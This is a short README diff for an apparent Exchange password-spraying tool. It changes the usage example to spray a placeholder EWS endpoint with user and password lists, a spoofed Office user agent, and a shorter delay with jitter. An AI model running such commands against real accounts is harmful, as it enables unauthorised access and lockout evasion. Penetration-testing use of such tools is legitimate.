@@ -18,7 +18,7 @@ Microsoft Exchange password spraying tool with proxy capabilities.
 ### Usage
 
 ```
-$ python3 exchange_password_spray.py -U userlist.txt -P password.txt --url https://webmail.example.org/EWS/Exchange.asmx --delay 62 -T 1 -ua "Microsoft Office/16.0 (Windows NT 10.0; MAPI 16.0.9001; Pro)" -O result.txt -v
+$ python3 exchange_password_spray.py -U userlist.txt -P password.txt --url https://webmail.example.org/EWS/Exchange.asmx --delay 3 --jitter 2 -T 1 -ua "Microsoft Office/16.0 (Windows NT 10.0; MAPI 16.0.9001; Pro)" -O result.txt -v
 ```
 
 
